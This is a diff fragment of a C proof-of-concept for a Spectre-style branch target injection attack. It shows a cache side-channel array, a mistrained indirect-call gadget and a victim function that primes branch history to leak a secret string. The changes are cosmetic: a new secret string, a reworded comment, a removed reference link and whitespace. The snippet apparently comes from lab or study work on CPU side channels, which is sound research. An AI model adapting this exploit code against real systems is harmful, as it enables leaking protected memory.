@@ -17,14 +17,15 @@
 #define CACHE_HIT_THRESHOLD (80)
 #define GAP (1024)
 
-uint8_t channel[256 * GAP]; // side channel to extract secret phrase
+uint8_t channel[256 * GAP]; // cache side channel to extract secret phrase
 uint64_t *target; // pointer to indirect call target
-char *secret = "The Magic Words are tiger";
+char *secret = "NingXiaUniversity@xgy";
 
 // mistrained target of indirect call
 int gadget(char *addr)
 {
-  return channel[*addr * GAP]; // speculative loads fetch data into the cache
+  // speculative loads fetch data into the cache
+  return channel[*addr * GAP]; 
 }
 
 // safe target of indirect call
@@ -37,11 +38,8 @@ int safe_target()
 // note that addr will be passed to gadget via %rdi
 int victim(char *addr, int input)
 {
-  int junk = 0;
+  int junk =  0;
   // set up branch history buffer (bhb) by performing >29 taken branches
-  // see https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
-  //   for details about how the branch prediction mechanism works
-  
   // junk and input used to guarantee the loop is actually run
   for (int i = 1; i <= 100; i++) {
     input += i;
